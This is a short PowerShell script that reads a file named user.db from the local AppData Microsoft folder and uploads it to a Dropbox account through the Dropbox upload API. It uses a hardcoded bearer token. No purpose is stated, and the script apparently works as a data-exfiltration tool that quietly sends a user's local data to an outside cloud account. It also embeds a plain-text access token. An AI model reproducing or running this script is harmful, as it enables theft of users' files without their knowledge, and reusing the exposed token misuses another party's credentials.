# Set the path to the file to upload
$fileToUpload = "$env:LOCALAPPDATA\Microsoft\user.db"

# Set the Dropbox access token
$accessToken = "sl.BbtkrYORs55gK99uUh5x4d7qJKjWXfoB7cUI78ELi5xLfw4zgX_lxn45F40TVUWru3EMJPq_VKAcjabOdW99a7a4pqbOI6GKqSzS8p-gjMq2m8AB-nrzRml-PiiqIu70OlzjYXNF2cRt"

# Set the Dropbox API endpoint
$dropboxApiEndpoint = "https://content.dropboxapi.com/2/files/upload"

# Set the Dropbox API headers
$dropboxApiHeaders = @{
    "Authorization" = "Bearer $accessToken"
    "Dropbox-API-Arg" = '{"path":"/user.db","mode":"add","autorename":true,"mute":false}'
    "Content-Type" = "application/octet-stream"
}

# Upload the file to Dropbox
Invoke-RestMethod -Method POST -Uri $dropboxApiEndpoint -Headers $dropboxApiHeaders -InFile $fileToUpload
